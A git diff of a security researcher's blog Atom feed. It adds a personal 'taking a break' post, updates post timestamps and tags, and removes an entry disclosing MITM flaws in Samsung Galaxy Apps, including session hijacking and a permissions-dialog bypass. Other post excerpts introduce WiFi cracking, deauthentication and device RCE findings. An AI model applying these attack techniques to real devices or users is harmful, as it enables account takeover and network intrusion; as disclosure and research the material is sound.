@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.evilsocket.net/"/>
-  <updated>2019-10-22T10:30:26.261Z</updated>
+  <updated>2020-05-26T19:48:35.646Z</updated>
   <id>https://www.evilsocket.net/</id>
   
   <author>
@@ -16,11 +16,50 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>Just Taking a Break :D</title>
+    <link href="https://www.evilsocket.net/2020/05/26/Just-taking-a-break/"/>
+    <id>https://www.evilsocket.net/2020/05/26/Just-taking-a-break/</id>
+    <published>2020-05-26T18:39:44.000Z</published>
+    <updated>2020-05-26T19:48:35.646Z</updated>
+    
+    <content type="html"><![CDATA[<p>Hey ya all! Since I’ve <a href="https://twitter.com/0xRogue/status/1263632571595919365?s=20" target="_blank" rel="noopener">read around</a> a <a href="https://twitter.com/0xRogue/status/1263625214761545729?s=20" target="_blank" rel="noopener">few people</a> are <a href="https://twitter.com/CristianPes/status/1249754870426501126?s=20" target="_blank" rel="noopener">wondering</a> what happened to me I thought about writing a brief “status update” on my blog, especially for those who came asking on Pwnagotchi’s Slack channels and seemed to be sincerely worried.</p>
+<p>I’m well and sound, after a pretty sad/traumatic yet productive 2019 I decided to re-evaluate how I was spending my energies, both mental and physical, and took a step back to put things in perspective. I’ve been active in the OSS world for quite a long time, developed several more or less useful projects I shared and maintained for free, and I’m both proud of and thankful for that, as it allowed me to develop my technical abilities and ultimately my professional career. Nothing is free and this came with the price of sacrificing most of my time and not focusing on other things that made me happy, possibly happier than programming at this point, including taking care of my own mental health.</p>
+<p>So just right before this whole covid19 mess started I enrolled to a music school in my home town, motivated to pursue what has always been kind of a “secret” dream of mine, becoming a musician, a path that I took in my teenage years but that I kinda gave up as I started living on my own very early and soon had a rent and bills to pay. Unfortunately (or not?) I work by focusing and investing all my energy on <strong>one-single-thing</strong> until I get familiar with it and I start to get some positive results that make me realize I’m on the right path, this has always been the case and probably won’t change now :D Spending that amount of time on both OSS and music is simply not doable.</p>
+<p>Neither I’m particularly interested in following what’s generally being referred to as “infosec” on socials, or in being part of it for what matters, as in my personal opinion “social infosec” is way more focused on individualism and sensationalism rather than actually getting things done. I believe what’s needed are new ideas and possibly solutions, not rockstars, con artists, ego, drama, trolls and whatnot. Although it was never my intent, I’ve been part of that problem for a while with my profile and my rants. I don’t want to be part of it anymore. My suggestion for whoever is reading and cares and might be new to this world, is to take with a grain of salt whoever is putting more effort in highlighting their own persona rather than their actual achievements and contributions, no matter how authoritative they might sound from their pedestals.</p>
+<p>So, in this spirit and after realizing how much time and mental energy both coding and socials were draining from me I just deactivated my accounts and paused all my projects. Now I’m writing code and doing research just for my job, sporadically merging some PRs people send to the projects I’ve developed, and that’s it, the rest of my time I spend playing guitar (my main instrument since I was 15) and piano (that I started to study recently).</p>
+<p>It’s going to be a new and long ride, I’m not scared, it makes me happy like I wasn’t from a very long time.</p>
+<p>Thanks for everybody who cared and asked what happened to me, cya in <em>the world of the electron and the switch</em>.</p>
+<p>PS, to whoever is spreading fake rumors about me: you should really think about where you got your intel from and how your naiveness and bias are being weaponized. Fact checking might be your friend.</p>
+<p align="center"><br>  <img src="https://i.pinimg.com/originals/0e/85/af/0e85af756c464e165b5ba9c3d4996eea.png"><br></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Hey ya all! Since I’ve &lt;a href=&quot;https://twitter.com/0xRogue/status/1263632571595919365?s=20&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;read around&lt;/
+    
+    </summary>
+    
+    
+      <category term="personal life" scheme="https://www.evilsocket.net/tags/personal-life/"/>
+    
+      <category term="mental health" scheme="https://www.evilsocket.net/tags/mental-health/"/>
+    
+      <category term="infosec" scheme="https://www.evilsocket.net/tags/infosec/"/>
+    
+      <category term="music" scheme="https://www.evilsocket.net/tags/music/"/>
+    
+      <category term="time" scheme="https://www.evilsocket.net/tags/time/"/>
+    
+      <category term="life" scheme="https://www.evilsocket.net/tags/life/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Weaponizing and Gamifying AI for WiFi Hacking: Presenting Pwnagotchi 1.0.0</title>
     <link href="https://www.evilsocket.net/2019/10/19/Weaponizing-and-Gamifying-AI-for-WiFi-Hacking-Presenting-Pwnagotchi-1-0-0/"/>
     <id>https://www.evilsocket.net/2019/10/19/Weaponizing-and-Gamifying-AI-for-WiFi-Hacking-Presenting-Pwnagotchi-1-0-0/</id>
     <published>2019-10-19T08:45:28.000Z</published>
-    <updated>2019-10-22T10:30:26.261Z</updated>
+    <updated>2020-05-26T18:30:57.528Z</updated>
     
     <content type="html"><![CDATA[<p>This is the story of a summer project that started out of boredom and that evolved into something incredibly fun and unique. It is also the story of how that project went from being discussed on a porch by just two people, to having <a href="https://pwnagotchi.herokuapp.com/" target="_blank" rel="noopener">a community made of almost 700 awesome people</a> (and counting!) that gathered, polished it and made today’s release possible.</p>
 <p><strong>TL;DR: You can <a href="https://github.com/evilsocket/pwnagotchi/releases" target="_blank" rel="noopener">download the 1.0.0 .img file from here</a>, then just <a href="https://pwnagotchi.ai/installation/" target="_blank" rel="noopener">follow the instructions</a>.</strong></p>
@@ -171,7 +210,7 @@
     <link href="https://www.evilsocket.net/2019/05/22/How-to-create-a-Malware-detection-system-with-Machine-Learning/"/>
     <id>https://www.evilsocket.net/2019/05/22/How-to-create-a-Malware-detection-system-with-Machine-Learning/</id>
     <published>2019-05-22T21:59:13.000Z</published>
-    <updated>2019-10-19T08:14:27.107Z</updated>
+    <updated>2020-05-26T18:30:57.524Z</updated>
     
     <content type="html"><![CDATA[<p>In this post we’ll talk about two topics I love and that have been central elements of my (private) research for the last ~7 years: machine learning and malware detection.</p>
 <p>Having a rather empirical and definitely non-academic education, I know the struggle of a passionate developer who wants to approach machine learning and is trying to make sense of formal definitions, linear algebra and whatnot. Therefore, I’ll try to keep this as practical as possible in order to allow even the less <em>formally-educated</em> reader to understand and possibly start having fun with neural networks. </p>
@@ -410,7 +449,7 @@ vim encode.py
     <link href="https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/"/>
     <id>https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/</id>
     <published>2019-02-13T15:53:31.000Z</published>
-    <updated>2019-10-19T08:14:27.111Z</updated>
+    <updated>2020-05-26T18:30:57.527Z</updated>
     
     <content type="html"><![CDATA[<p>In this post, I’ll talk about the new WiFi related features that have been recently implemented into bettercap, starting from how the EAPOL <a href="https://wlan1nde.wordpress.com/2014/10/27/4-way-handshake/" target="_blank" rel="noopener">4-way handshake</a> capturing has been automated, to a whole new type of attack that will allow us to recover WPA PSK passwords of an AP without clients.</p>
 <p><img src="https://raw.githubusercontent.com/bettercap/media/master/logo.png" alt="logo"></p>
@@ -494,7 +533,7 @@ vim encode.py
     <link href="https://www.evilsocket.net/2018/11/22/Presenting-project-Ergo-how-to-build-an-airplane-detector-for-satellite-imagery-with-Deep-Learning/"/>
     <id>https://www.evilsocket.net/2018/11/22/Presenting-project-Ergo-how-to-build-an-airplane-detector-for-satellite-imagery-with-Deep-Learning/</id>
     <published>2018-11-22T17:15:50.000Z</published>
-    <updated>2019-10-19T08:14:27.110Z</updated>
+    <updated>2020-05-26T18:30:57.526Z</updated>
     
     <content type="html"><![CDATA[<p>It’s been a while that i’ve been quite intensively playing with <a href="https://blogs.nvidia.com/blog/2016/07/29/whats-difference-artificial-intelligence-machine-learning-deep-learning-ai/" target="_blank" rel="noopener">Deep Learning</a> both for work related research and personal projects. More specifically, I’ve been using the <a href="https://keras.io/" target="_blank" rel="noopener">Keras framework</a> on top of a <a href="https://www.tensorflow.org/" target="_blank" rel="noopener">TensorFlow</a> backend for all sorts of stuff. From big and complex projects for malware detection, to smaller and simpler experiments about ideas i just wanted to quickly implement and test - it didn’t really matter the scope of the project, I always found myself struggling with the same issues: code reuse over tens of crap python and shell scripts, datasets and models that are spread all over my dev and prod servers, no real standard for versioning them, no order, no structure. </p>
 <p>So a few days ago I started writing what it was initially meant to be just a simple wrapper for the main commands of my training pipelines but quickly became a full-fledged framework and manager for all my Keras based projects.</p>
@@ -613,7 +652,7 @@ sudo pip3 install tensorflow-gpu
     <link href="https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/"/>
     <id>https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/</id>
     <published>2018-07-28T17:01:56.000Z</published>
-    <updated>2019-10-19T08:14:27.111Z</updated>
+    <updated>2020-05-26T18:30:57.527Z</updated>
     
     <content type="html"><![CDATA[<p>A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my pocket that periodically jumps on all the channels in the WiFi spectrum, collects information about the nearby access points and their connected clients and then sends a deauthentication packet to each one of them, resulting in some sort of WiFi jammer on the 802.11 level. As an interesting “side effect” of this jammer (the initial intent was <em>purely for the lulz</em>) is that the more it deauths, the higher the changes to also sniff WPA2 handshakes.</p>
 <p>Thanks to the awesome work of the Kali and Nexmon communities in packaging the nexmon drivers and utilities and to the recent changes we released in bettercap, this was very easy to setup and to script and given <a href="https://twitter.com/evilsocket/status/1021367629901115392" target="_blank" rel="noopener">the interest the tweet had</a> I thought to share this writeup :)</p>
@@ -718,7 +757,7 @@ sudo pip3 install tensorflow-gpu
     <link href="https://www.evilsocket.net/2018/03/14/Go-is-amazing-so-here-s-what-i-don-t-like-about-it/"/>
     <id>https://www.evilsocket.net/2018/03/14/Go-is-amazing-so-here-s-what-i-don-t-like-about-it/</id>
     <published>2018-03-14T22:39:09.000Z</published>
-    <updated>2019-10-19T08:14:27.106Z</updated>
+    <updated>2020-05-26T18:30:57.523Z</updated>
     
     <content type="html"><![CDATA[<p>After my last post and generally the kind of indirect advertising I’m doing to the Go programming language for a few months now, I heard about and talked with a lot of people who started being interested in the language, so for once I decided to write what I don’t like about it instead, to provide a more balanced perspective of what’s my experience so far and maybe let some of those people realize that Go is not the right choice for their projects after all.</p>
 <p><strong>NOTE 1</strong></p>
@@ -812,7 +851,7 @@ With this I don&apos;t mean &quot;generics == OOP&quot;, but just that the major
     <link href="https://www.evilsocket.net/2018/02/27/All-hail-bettercap-2-0-one-tool-to-rule-them-all/"/>
     <id>https://www.evilsocket.net/2018/02/27/All-hail-bettercap-2-0-one-tool-to-rule-them-all/</id>
     <published>2018-02-27T19:37:20.000Z</published>
-    <updated>2019-10-19T08:14:27.104Z</updated>
+    <updated>2020-05-26T18:30:57.516Z</updated>
     
     <content type="html"><![CDATA[<p>It’s with immense pleasure that I announce the <a href="https://github.com/bettercap/bettercap/releases/tag/v2.0.0" target="_blank" rel="noopener">release of the second generation of bettercap</a>, a complete reimplementation of the most complete and advanced Man-in-the-Middle attack framework. This release not only brings MITM attacks to the next level, but it aims to be the reference framework for network monitoring (we &lt;3 blueteams too), 802.11, BLE attacks and more! :D</p>
 <center><br><strong style="font-size:25px"><br>ベッターキャップ！<br></strong><br><img width="200px" src="https://www.bettercap.org/img/logo.png"><br></center>
@@ -887,7 +926,7 @@ With this I don&apos;t mean &quot;generics == OOP&quot;, but just that the major
     <link href="https://www.evilsocket.net/2017/12/07/DIY-Portable-Secrets-Manager-with-a-RPI-Zero-and-the-ARC-Project/"/>
     <id>https://www.evilsocket.net/2017/12/07/DIY-Portable-Secrets-Manager-with-a-RPI-Zero-and-the-ARC-Project/</id>
     <published>2017-12-07T16:42:48.000Z</published>
-    <updated>2019-10-19T08:14:27.105Z</updated>
+    <updated>2020-05-26T18:30:57.517Z</updated>
     
     <content type="html"><![CDATA[<p>For the last few days I’ve been working on a new project which I developed for very specific needs and reasons:</p>
 <ol>
@@ -1026,7 +1065,7 @@ mv arcd_arm arcd
     <link href="https://www.evilsocket.net/2017/09/23/This-is-not-a-post-about-BLE-introducing-BLEAH/"/>
     <id>https://www.evilsocket.net/2017/09/23/This-is-not-a-post-about-BLE-introducing-BLEAH/</id>
     <published>2017-09-23T15:06:56.000Z</published>
-    <updated>2019-10-19T08:14:27.112Z</updated>
+    <updated>2020-05-26T18:30:57.528Z</updated>
     
     <content type="html"><![CDATA[<p>This is not a post about BLE, but rather on how to hack it … well, to be honest, BLE devices are usually very easy to hack, so it’s just a quick intro to it, I’ll also take the chance to open source one of the last tools I’ve made and that I kept private so far. I moved the features I thought to be dangerous ( aka: auto fuzzing all the BLE things and bring chaos ) in a private fork which will stay private, however it’s not that complicated to chain <code>bleah</code> with other tools ( cough … radamsa … cough ) and have <strong>lots of fun</strong>.</p>
 <p><img src="/images/2017/09/dr_evil.jpg" alt="dr.evil"></p>
@@ -1091,11 +1130,11 @@ AA:BB:CC:DD:EE:FF [LG] webOS TV OLED55E6V
     
       <category term="ble" scheme="https://www.evilsocket.net/tags/ble/"/>
     
-      <category term="btle" scheme="https://www.evilsocket.net/tags/btle/"/>
+      <category term="bluetooth low energy" scheme="https://www.evilsocket.net/tags/bluetooth-low-energy/"/>
     
       <category term="bluetooth" scheme="https://www.evilsocket.net/tags/bluetooth/"/>
     
-      <category term="bluetooth low energy" scheme="https://www.evilsocket.net/tags/bluetooth-low-energy/"/>
+      <category term="btle" scheme="https://www.evilsocket.net/tags/btle/"/>
     
       <category term="bleah" scheme="https://www.evilsocket.net/tags/bleah/"/>
     
@@ -1106,7 +1145,7 @@ AA:BB:CC:DD:EE:FF [LG] webOS TV OLED55E6V
     <link href="https://www.evilsocket.net/2017/08/25/Mini-Post-Hacking-a-Herb-Vaporizer-using-GNU-Linux-and-BLE-raw-commands/"/>
     <id>https://www.evilsocket.net/2017/08/25/Mini-Post-Hacking-a-Herb-Vaporizer-using-GNU-Linux-and-BLE-raw-commands/</id>
     <published>2017-08-25T01:10:53.000Z</published>
-    <updated>2019-10-19T08:14:27.109Z</updated>
+    <updated>2020-05-26T18:30:57.525Z</updated>
     
     <content type="html"><![CDATA[<p>Tonight my brain decided, instead of sleeping (why even bother trying, right?), to start a <a href="/2015/01/29/nike-fuelband-se-ble-protocol-reversed/">new</a> short adventure in the <strong>Bluetooth Low Energy</strong> world. I’m a happy <a href="https://www.storz-bickel.com/eu/en/crafty.html" target="_blank" rel="noopener">Crafty</a> vaporizer owner and as I discovered by chance, I can access it using my laptop.</p>
 <p><img src="/images/2017/08/ble_1.png" alt="ble_1"></p>
@@ -1142,17 +1181,17 @@ AA:BB:CC:DD:EE:FF [LG] webOS TV OLED55E6V
     </summary>
     
     
-      <category term="ble" scheme="https://www.evilsocket.net/tags/ble/"/>
-    
       <category term="hacking" scheme="https://www.evilsocket.net/tags/hacking/"/>
+    
+      <category term="ble" scheme="https://www.evilsocket.net/tags/ble/"/>
     
       <category term="linux" scheme="https://www.evilsocket.net/tags/linux/"/>
     
-      <category term="btle" scheme="https://www.evilsocket.net/tags/btle/"/>
+      <category term="bluetooth low energy" scheme="https://www.evilsocket.net/tags/bluetooth-low-energy/"/>
     
       <category term="bluetooth" scheme="https://www.evilsocket.net/tags/bluetooth/"/>
     
-      <category term="bluetooth low energy" scheme="https://www.evilsocket.net/tags/bluetooth-low-energy/"/>
+      <category term="btle" scheme="https://www.evilsocket.net/tags/btle/"/>
     
       <category term="low energy" scheme="https://www.evilsocket.net/tags/low-energy/"/>
     
@@ -1171,7 +1210,7 @@ AA:BB:CC:DD:EE:FF [LG] webOS TV OLED55E6V
     <link href="https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/"/>
     <id>https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/</id>
     <published>2017-08-15T15:13:21.000Z</published>
-    <updated>2019-10-19T08:14:27.114Z</updated>
+    <updated>2020-05-26T18:30:57.529Z</updated>
     
     <content type="html"><![CDATA[<p>It’s no secret I’ve been recently playing with the <a href="https://www.indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2" target="_blank" rel="noopener">GPD Pocket 7</a>, an ultra small laptop which can run GNU/Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan of ultra portable Linux devices since the <a href="https://www.google.com/search?&amp;source=lnms&amp;tbm=isch&amp;q=open+zaurus+sl-c1000" target="_blank" rel="noopener">Sharp Zaurus</a> series. Considering that a <a href="https://twitter.com/evilsocket/status/896847606072127488" target="_blank" rel="noopener">lot of people were interested</a> I decided to write this post to share my impressions, installation procedure and configuration tips.</p>
 <p><img src="https://pbs.twimg.com/media/DG4TXarXcAAsxSa.jpg" alt="gpd"></p>
@@ -1297,7 +1336,7 @@ sudo git reset --hard origin/master
     <link href="https://www.evilsocket.net/2017/06/30/BetterCap-1-6-1-TLS-Server-Name-Indication-and-Why-We-Need-to-Encrypt-It/"/>
     <id>https://www.evilsocket.net/2017/06/30/BetterCap-1-6-1-TLS-Server-Name-Indication-and-Why-We-Need-to-Encrypt-It/</id>
     <published>2017-06-30T10:28:18.000Z</published>
-    <updated>2019-10-19T08:14:27.105Z</updated>
+    <updated>2020-05-26T18:30:57.517Z</updated>
     
     <content type="html"><![CDATA[<p>Yesterday I released version 1.6.1 of <a href="https://bettercap.org" target="_blank" rel="noopener">bettercap</a> and among other things, you can read in the changelog:</p>
 <pre><code>* Huge improvement on HTTPS parser, now it parses TLS Client Hello messages with SNI extension in order to extract the real hostname.
@@ -1349,7 +1388,7 @@ Connection: close
     <link href="https://www.evilsocket.net/2017/05/30/Terramaster-NAS-Unauthenticated-RCE-as-root/"/>
     <id>https://www.evilsocket.net/2017/05/30/Terramaster-NAS-Unauthenticated-RCE-as-root/</id>
     <published>2017-05-30T11:15:28.000Z</published>
-    <updated>2019-10-19T08:14:27.112Z</updated>
+    <updated>2020-05-26T18:30:57.527Z</updated>
     
     <content type="html"><![CDATA[<p>Recently I bought a TerraMaster F2-420 NAS from Amazon in order to store my private code, backups and this kind of stuff. As soon as it arrived I started to play with its web interface and eventually I wanted to see how it was implemented, moreover I was curious to see if I could find any remotely exploitable vulnerability.</p>
 <p>As you can see … I succeeded :)</p>
@@ -1411,7 +1450,7 @@ Connection: close
     <link href="https://www.evilsocket.net/2017/04/27/Android-Applications-Reversing-101/"/>
     <id>https://www.evilsocket.net/2017/04/27/Android-Applications-Reversing-101/</id>
     <published>2017-04-27T17:09:48.000Z</published>
-    <updated>2019-10-19T08:14:27.104Z</updated>
+    <updated>2020-05-26T18:30:57.516Z</updated>
     
     <content type="html"><![CDATA[<p>Every day we see a bunch of new Android applications being published on the Google Play Store, from games, to utilities, to IoT devices clients and so forth, almost every single aspect of our life can be somehow controlled with “an app”. We have smart houses, <a href="https://www.evilsocket.net/2015/01/29/nike-fuelband-se-ble-protocol-reversed/">smart fitness devices</a> and <a href="https://www.evilsocket.net/2016/10/09/IoCOFFEE-Reversing-the-Smarter-Coffee-IoT-machine-protocol-to-make-coffee-using-terminal/">smart coffee machines</a> … but is this stuff just smart or is it <strong>secure</strong> as well? :)</p>
 <p>Reversing an Android application can be a (relatively) easy and fun way to answer this question, that’s why I decided to write this blog post where I’ll try to explain the basics and give you some of my “tricks” to reverse this stuff faster and more effectively.</p>
@@ -1610,11 +1649,11 @@ The jar is located at /data/data/de.robv.android.xposed.installer/bin/XposedBrid
     
       <category term="android" scheme="https://www.evilsocket.net/tags/android/"/>
     
+      <category term="dalvik" scheme="https://www.evilsocket.net/tags/dalvik/"/>
+    
       <category term="reversing" scheme="https://www.evilsocket.net/tags/reversing/"/>
     
       <category term="apk" scheme="https://www.evilsocket.net/tags/apk/"/>
-    
-      <category term="dalvik" scheme="https://www.evilsocket.net/tags/dalvik/"/>
     
       <category term="dex" scheme="https://www.evilsocket.net/tags/dex/"/>
     
@@ -1645,7 +1684,7 @@ The jar is located at /data/data/de.robv.android.xposed.installer/bin/XposedBrid
     <link href="https://www.evilsocket.net/2017/01/14/Thoughts-on-WhatsApp-E2E-Encryption-AKA-Security-is-real-only-if-it-s-the-default/"/>
     <id>https://www.evilsocket.net/2017/01/14/Thoughts-on-WhatsApp-E2E-Encryption-AKA-Security-is-real-only-if-it-s-the-default/</id>
     <published>2017-01-14T19:10:02.000Z</published>
-    <updated>2019-10-19T08:14:27.112Z</updated>
+    <updated>2020-05-26T18:30:57.528Z</updated>
     
     <content type="html"><![CDATA[<p>Yesterday <a href="https://twitter.com/tobiasboelter" target="_blank" rel="noopener">Tobias Boelter</a> posted on his blog <a href="https://tobi.rocks/2017/01/whatsapp-vulnerability-bug-or-backdoor/" target="_blank" rel="noopener">this article</a> which essentially highlights a message rentransmission vulnerability on WhatsApp which makes it leak sensitive information if the recipient’s key changed, only alerting the user <strong>after</strong> the message has been sent.<br>The Guardian has then picked up the info and posted the article “<a href="https://www.theguardian.com/technology/2017/jan/13/whatsapp-backdoor-allows-snooping-on-encrypted-messages" target="_blank" rel="noopener">WhatsApp vulnerability allows snooping on encrypted messages</a>“. </p>
 <p>In a matter of hours, a shit load of experts (and unfortunately also lot of ppl who are <strong>not</strong> experts at all) pointed their fingers at The Guardian, arguing that it’s not a backdoor and all other kind of sterile polemics. At some point, Moxie from Open Whisper Systems, the noprofit organization who made <strong>Signal</strong>, the only really secure messaging app we’re aware of <strong>and</strong> the library that WhatsApp recently integrated in order to give E2E encrypted messaging to all of their users, published on the blog this: “<a href="https://whispersystems.org/blog/there-is-no-whatsapp-backdoor/" target="_blank" rel="noopener">There is no WhatsApp ‘backdoor’</a>“, which <strong>seemed</strong> to have put the word END to this conversation.</p>
@@ -1701,7 +1740,7 @@ The jar is located at /data/data/de.robv.android.xposed.installer/bin/XposedBrid
     <link href="https://www.evilsocket.net/2016/10/09/IoCOFFEE-Reversing-the-Smarter-Coffee-IoT-machine-protocol-to-make-coffee-using-terminal/"/>
     <id>https://www.evilsocket.net/2016/10/09/IoCOFFEE-Reversing-the-Smarter-Coffee-IoT-machine-protocol-to-make-coffee-using-terminal/</id>
     <published>2016-10-09T13:09:11.000Z</published>
-    <updated>2019-10-19T08:14:27.108Z</updated>
+    <updated>2020-05-26T18:30:57.525Z</updated>
     
     <content type="html"><![CDATA[<p>I love coffee, that’s a fact, and I drink liters of it during the week … I also am a nerd and a hacker, so a few days ago I bought a <a href="http://smarter.am/coffee/" target="_blank" rel="noopener">Smarter Coffee</a> machine on Amazon, basically a coffee machine that you can control over your home wifi network using a mobile application ( both for Android and iOS ).<br>The app is really nice: you can set the amount of cups you want, the strength of the coffee, etc, then you only need to press a button and wait for your delicious coffee to be brewed.</p>
 <p>Since I work from home, most of the times I’m using the computer keyboard, not a smartphone, therefore I wanted/needed a console client for it, something that the vendor never released, so I started reversing the Android application in order to understand the communication protocol and write my own client implementation … guess what? :D</p>
@@ -1772,11 +1811,11 @@ Options:
     </summary>
     
     
-      <category term="reversing" scheme="https://www.evilsocket.net/tags/reversing/"/>
-    
       <category term="hack" scheme="https://www.evilsocket.net/tags/hack/"/>
     
       <category term="hacking" scheme="https://www.evilsocket.net/tags/hacking/"/>
+    
+      <category term="reversing" scheme="https://www.evilsocket.net/tags/reversing/"/>
     
       <category term="coffee" scheme="https://www.evilsocket.net/tags/coffee/"/>
     
@@ -1795,7 +1834,7 @@ Options:
     <link href="https://www.evilsocket.net/2016/10/02/Un-po-di-consigli-per-aspiranti-professionisti-del-settore-della-sicurezza-informatica/"/>
     <id>https://www.evilsocket.net/2016/10/02/Un-po-di-consigli-per-aspiranti-professionisti-del-settore-della-sicurezza-informatica/</id>
     <published>2016-10-02T16:39:08.000Z</published>
-    <updated>2019-10-19T08:14:27.113Z</updated>
+    <updated>2020-05-26T18:30:57.528Z</updated>
     
     <content type="html"><![CDATA[<p>Recentemente è stata pubblicata <a href="http://motherboard.vice.com/it/read/intervista-hacker-italiano-evilsocket" target="_blank" rel="noopener">una mia intervista</a> su Motherboard di VICE e appena qualche ora dopo ho iniziato a ricevere un quantitativo stupefacente di email da persone che chiedevano fondamentalmente tutte la stessa cosa, un po di consigli per aspiranti professionisti nel settore della sicurezza informatica.</p>
 <p>Considerando che rispondere individualmente ad ogni email sarebbe poco fattibile ho allora deciso di scrivere un post nel quale raccogliere alcuni di questi consigli.<br>Se per alcuni di voi lettori dovessero sembrare delle banalità, mi scuso fin da subito, ma l’età di chi mi ha mandato quelle email è molto varia, così come il loro background professionale, quindi volerò abbastanza basso ed elencherò solo alcune delle basi.</p>
@@ -1872,7 +1911,7 @@ Options:
     <link href="https://www.evilsocket.net/2016/09/15/WiFi-Pineapple-NANO-OS-X-and-BetterCap-setup/"/>
     <id>https://www.evilsocket.net/2016/09/15/WiFi-Pineapple-NANO-OS-X-and-BetterCap-setup/</id>
     <published>2016-09-15T12:48:23.000Z</published>
-    <updated>2019-10-19T08:14:27.114Z</updated>
+    <updated>2020-05-26T18:30:57.529Z</updated>
     
     <content type="html"><![CDATA[<p>After a few weeks of testing on the field, I’ve found the perfect configuration for WiFi pentesting using a WiFi Pineapple NANO, an OSX laptop and BetterCap.<br>Since different people from different forums had issues making this work ( mostly due to the difficulties of internet connection sharing between OSX and the Pineapple ) I’ve decided to share my setup today ^_^</p>
 <center><br><img src="/images/2016/09/nano.jpg" alt="nano"><br></center>
@@ -1977,7 +2016,7 @@ esac
     <link href="https://www.evilsocket.net/2016/08/24/RCE-against-every-open-source-BTS/"/>
     <id>https://www.evilsocket.net/2016/08/24/RCE-against-every-open-source-BTS/</id>
     <published>2016-08-24T18:43:14.000Z</published>
-    <updated>2019-10-19T08:14:27.111Z</updated>
+    <updated>2020-05-26T18:30:57.527Z</updated>
     
     <content type="html"><![CDATA[<p>This is a repost of an analysis of mine that has been posted on Zimperium’s blog, basically I’ve found that the following products are vulnerable to remote command execution, plus other various logic errors n’ stuff:</p>
 <ul>
@@ -2028,87 +2067,6 @@ esac
       <category term="osmobts" scheme="https://www.evilsocket.net/tags/osmobts/"/>
     
       <category term="disclosure" scheme="https://www.evilsocket.net/tags/disclosure/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Samsung Galaxy Apps MITM Vulnerabilities</title>
-    <link href="https://www.evilsocket.net/2016/08/17/Samsung-Galaxy-Apps-MITM-Vulnerabilities/"/>
-    <id>https://www.evilsocket.net/2016/08/17/Samsung-Galaxy-Apps-MITM-Vulnerabilities/</id>
-    <published>2016-08-17T10:01:42.000Z</published>
-    <updated>2019-10-19T08:14:27.111Z</updated>
-    
-    <content type="html"><![CDATA[<p>The Samsung “Galaxy Apps” application installed on every recent Samsung device, a parallel store application with both apps for Samsung smartphones and smart watches, is vulnerable to MITM attacks which could cause user information leaks, permissions dialog bypass and session hijacking.</p>
-<h4 id="Affected-Products"><a href="#Affected-Products" class="headerlink" title="Affected Products"></a>Affected Products</h4><p>Samsung Galaxy Apps &lt;= 4.1.01-14</p>
-<center><br><img src="/images/2016/08/galaxyapps.png" alt="galaxy apps"><br></center>
-
-<a id="more"></a>
-<h2 id="MITM-Information-Leaks-and-Session-Hijacking"><a href="#MITM-Information-Leaks-and-Session-Hijacking" class="headerlink" title="MITM, Information Leaks and Session Hijacking"></a>MITM, Information Leaks and Session Hijacking</h2><h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><p>Most of the application API requests are made through a unsafe HTTP connection which would allow a malicious third party to perform a network MITM attack and eventually exfiltrate user sensitive data such as his session identifier and subsequently use this data to impersonate the user session.</p>
-<h4 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h4><p>The application relies on a XML based API used through HTTP, as soon as the user will open the app and start browsing a network attacker will be able to see requests sent to the API server and the user session data, for instance the first request being executed when the user clicks on an application detail page, identified by the name <strong>productDetailOverview</strong> is composed as shown in the following picture.</p>
-<center><br><img src="/images/2016/08/productDetailOverview.png" alt="galaxy apps"><br></center>
-
-<p>The XML response will contain application data such as the creation date, last update date, product name and description, etc.</p>
-<p>It is possible to see that the user session cookies ( <strong>UUID</strong> and <strong>JSESSIONID</strong> ) are sent in cleartext, therefore they can be used by an attacker to impersonate the user and perform API requests on his behalf.</p>
-<p>Other XML request names sent during application browsing and installation are:</p>
-<ul>
-<li><strong>bigBannerList</strong>, used to obtain application preview images.</li>
-<li><strong>expertCommentList</strong> and commentList, these fetch comments for an app.</li>
-<li><strong>productDetailRelated</strong>, fetches related applications list.</li>
-<li><strong>categoryProductList2Notc</strong>, fetches products in the same category.</li>
-<li><strong>sellerProductList2Notc</strong>, fetches other products of the same vendor.</li>
-<li><strong>androidManifestList</strong>, fetches the list of permissions required by the application before installing it ( more on this later ).</li>
-</ul>
-<h4 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h4><ul>
-<li>User Impersonation - An attacker could use the exfiltrated session data to authenticate against the API server on the user’s behalf.</li>
-<li>Contents Manipulation - With a transparent proxy and proper redirection rules, an attacker could intercept and modify the XML responses before they’re received by the application, this would allow him to replace product images, names and descriptions with fake ones.</li>
-</ul>
-<h2 id="Permissions-Dialog-Bypass"><a href="#Permissions-Dialog-Bypass" class="headerlink" title="Permissions Dialog Bypass"></a>Permissions Dialog Bypass</h2><h4 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h4><p>It is possible for an attacker performing a MITM network attack to intercept and modify the XML response of the <strong>androidManifestList</strong> request and force the product to install an application without showing to the user the permission list dialog which would require his approval.</p>
-<h4 id="Details-1"><a href="#Details-1" class="headerlink" title="Details"></a>Details</h4><p>Once the user clicks on the “Install” button, an <strong>androidManifestList</strong> request is sent to the API endpoint in order to fetch the list of permissions that the application requires:</p>
-<center><br><img src="/images/2016/08/androidManifestList.png" alt="galaxy apps"><br></center>
-
